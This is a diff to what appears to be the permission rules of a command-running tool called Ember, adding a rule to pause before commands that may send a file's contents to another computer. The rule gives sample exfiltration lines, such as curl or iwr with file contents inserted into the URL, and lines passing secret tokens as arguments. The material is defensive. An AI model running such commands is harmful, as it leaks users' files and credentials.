@@ -212,6 +212,13 @@ Ember stops and asks before a command that:
   written on the command line; and a variable named for one handed to any program as an argument, known to Ember or
   not (`mytool --token "$GITHUB_TOKEN"`, `curl -H "Authorization: Bearer $API_KEY" …`, `$env:NPM_TOKEN`, `%NPM_TOKEN%`):
   the program is given the secret and may print it;
+- **may send a file's contents somewhere** ("May send what a file or a command holds to another computer."): a
+  program that fetches or sends (`curl`, `wget`, httpie, `Invoke-WebRequest`, `nc` and their like) whose address,
+  header, cookie, sign-in or field holds what a command or a read gave: `curl "https://example.com/?d=$(cat
+  notes.txt)"`, backticks, `$(<notes.txt)`, `d=$(cat notes.txt); curl "…?d=$d"`, `curl -H @notes.txt …`, `http
+  example.com < notes.txt`, in PowerShell `iwr "…?d=$(gc notes.txt)"`. The usual addresses run: one built from the
+  machine's kind, the time, a commit or a version (`$(uname -m)`, `$(date +%s)`, `$(git rev-parse HEAD)`), from what
+  another fetch returned, or from a variable the line didn't fill (`curl $URL`);
 - **changes the system or needs privileges**: `sudo`, `su`, `runas`, installing or removing packages (`apt`, `dnf`,
   `brew`, `winget`, `npm install`, `pip install`), services, the registry and desktop settings (`gsettings set`,
   `dconf write`, and `defaults write` to the screen saver, firewall and remote-access settings), the firewall, the
